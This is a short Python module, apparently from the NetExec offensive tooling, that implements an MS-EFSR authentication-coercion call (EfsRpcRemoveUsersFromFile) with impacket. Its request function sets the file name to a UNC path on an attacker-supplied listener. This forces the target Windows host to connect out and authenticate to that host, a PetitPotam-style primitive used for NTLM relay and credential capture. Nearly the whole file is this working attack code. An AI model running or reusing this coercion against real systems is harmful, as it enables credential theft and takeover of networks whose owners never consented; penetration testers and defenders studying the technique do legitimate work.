from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR

from nxc.data.coercer_method.MS_EFSR.dtypes import ENCRYPTION_CERTIFICATE_HASH_LIST
from nxc.data.coercer_method.DCERPCSessionError import DCERPCSessionError


class EfsRpcRemoveUsersFromFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/28609dad-5fa5-4af9-9382-18d40e3e9dec)"""
    opnum = 8
    structure = (
        ("FileName", WSTR),
        ("Users", ENCRYPTION_CERTIFICATE_HASH_LIST)
    )


class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcRemoveUsersFromFile()
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    dce.request(request)